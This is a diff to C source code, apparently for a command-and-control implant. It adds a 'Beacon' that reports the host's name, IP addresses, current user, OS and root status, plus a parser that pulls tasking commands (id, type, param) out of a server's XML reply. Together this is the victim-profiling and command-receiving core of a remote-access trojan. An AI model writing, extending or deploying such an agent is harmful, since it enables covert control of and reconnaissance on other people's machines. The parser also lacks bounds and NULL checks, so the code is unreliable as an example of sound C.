@@ -12,7 +12,13 @@
 #include <sys/socket.h>
 #include <netdb.h>
 
+#include "colors.h"
+#include "beacon.h"
 #include "utils.h"
+
+//int ID = 0;
+
+/************************** BEACON ******************************/
 
 #define MAX_IP_ENTRY_SIZE 64
 
@@ -114,10 +120,12 @@ char *get_beacon(void)
 	char *pos = beacon;
 	pos = append_buff(pos, "<Beacon>\n");
 
+	//pos = append_buff(pos, "\t<ID>%d</ID>\n", ID);
+	pos = append_buff(pos, "\t<Type>HEY</Type>\n");
+
 	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
 	char *username = malloc(BEACON_FIELD_MAX_SIZE);
 	char *os = malloc(BEACON_FIELD_MAX_SIZE);
-	char admin;
 
 	// Get hostname
 	int r = gethostname(hostname, BEACON_FIELD_MAX_SIZE);
@@ -125,7 +133,7 @@ char *get_beacon(void)
 		fprintf(stderr, "gethostname: %s\n", strerror(errno));
 		sprintf(hostname, "");
 	}
-	pos = append_buff(pos, "    <HostName>%s</HostName>\n", hostname);
+	pos = append_buff(pos, "\t<HostName>%s</HostName>\n", hostname);
 
 	// Get IPs
 	char *ips[MAX_IPS];
@@ -135,12 +143,12 @@ char *get_beacon(void)
 		if (is_internal_ip(ips[i])) {
 			pos =
 			    append_buff(pos,
-					"    <InternalIP>%s</InternalIP>\n",
+					"\t<InternalIP>%s</InternalIP>\n",
 					ips[i]);
 		} else {
 			pos =
 			    append_buff(pos,
-					"    <ExternalIP>%s</ExternalIP>\n",
+					"\t<ExternalIP>%s</ExternalIP>\n",
 					ips[i]);
 		}
 	}
@@ -155,7 +163,7 @@ char *get_beacon(void)
 		fprintf(stderr, "getpwuid: %s\n", strerror(errno));
 		sprintf(username, "");
 	}
-	pos = append_buff(pos, "    <CurrentUser>%s</CurrentUser>\n", username);
+	pos = append_buff(pos, "\t<CurrentUser>%s</CurrentUser>\n", username);
 
 	// Get OS
 	struct utsname utsn;
@@ -164,14 +172,14 @@ char *get_beacon(void)
 		fprintf(stderr, "uname: %s\n", strerror(errno));
 		sprintf(os, "");
 	} else {
-		sprintf(os, "%s", utsn.sysname);	// release, version
+		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);	// release, version
 	}
-	pos = append_buff(pos, "    <OS>%s</OS>\n", os);
+	pos = append_buff(pos, "\t<OS>%s</OS>\n", os);
 
 	// Get Admin
 	uid_t uid = getuid();
-	admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
-	pos = append_buff(pos, "    <Admin>%c</Admin>\n", admin);
+	char admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
+	pos = append_buff(pos, "\t<Admin>%c</Admin>\n", admin);
 	pos = append_buff(pos, "</Beacon>\n", os);
 
 	free(hostname);
@@ -179,4 +187,98 @@ char *get_beacon(void)
 	free(os);
 
 	return beacon;
+}
+
+/*********************** BEACON RESPONSE ***************************/
+
+#define MAX_ATTR_LEN 128
+
+static char *get_attribute(const char *xml, const char *attr)
+{
+	char *name_start = strstr(xml, attr);
+	size_t name_len = strlen(attr);
+	char *value_start = name_start + name_len + 2;	// for '="'
+	size_t value_len = 0;
+	char *curr;
+	for (curr = value_start; *curr != '"'; curr++)
+		value_len++;
+
+	char *value = malloc(value_len + 1);	// '\0'
+	if (value == NULL) {
+		printf("malloc\n");
+		return NULL;
+	}
+
+	memcpy(value, value_start, value_len);
+	value[value_len] = '\0';
+	return value;
+}
+
+/* returns -1 if a system error occurred (malloc)
+   return 0 if the tag wasn't found
+   returns 1 if the tag was found
+   */
+static char *parse_command_from_xml(const char *xml, struct command *cmd)
+{
+	char *type;
+	char *param;
+	int id;
+
+	char *pos;
+	if ((pos = strstr(xml, "command id=\"")) == NULL) {
+		printf("[*] No (further) command found\n");
+		return NULL;
+	}
+
+	type = get_attribute(pos, "type");
+	param = get_attribute(pos, "param");
+	char *id_str = get_attribute(pos, "id");
+
+	/* Should do some sanity checks... */
+	cmd->id = (int)strtol(id_str, NULL, 10);
+	free(id_str);
+	cmd->type = type;
+	cmd->param = param;
+
+	return (pos + 1);
+}
+
+int get_commands(char *response, struct command **cmds)
+{
+	*cmds = NULL;
+	int cmd_num = 0;
+
+	if (response) {
+		char *cmds_section;
+		if ((cmds_section = strstr(response, "commands")) == NULL) {
+			printf("[*] XML does not have a commands section\n");
+			return cmd_num;
+		}
+		printf("[*] Commands section found\n");
+
+		char *pos = cmds_section;
+		struct command *last;
+		while (1) {
+			struct command *cmd = calloc(1, sizeof(struct command));
+
+			printf("[*] Fetching (next) command...\n");
+			if ((pos = parse_command_from_xml(pos, cmd)) == NULL)
+				/* No command found, stop */
+				break;
+
+			printf("[*] Found command [%d] %s : %s\n",
+			       cmd->id, cmd->type, cmd->param);
+
+			if (*cmds == NULL) {
+				*cmds = cmd;
+			} else {
+				last->next = cmd;
+			}
+			last = cmd;
+
+			cmd_num++;
+		}
+	}
+
+	return cmd_num;
 }
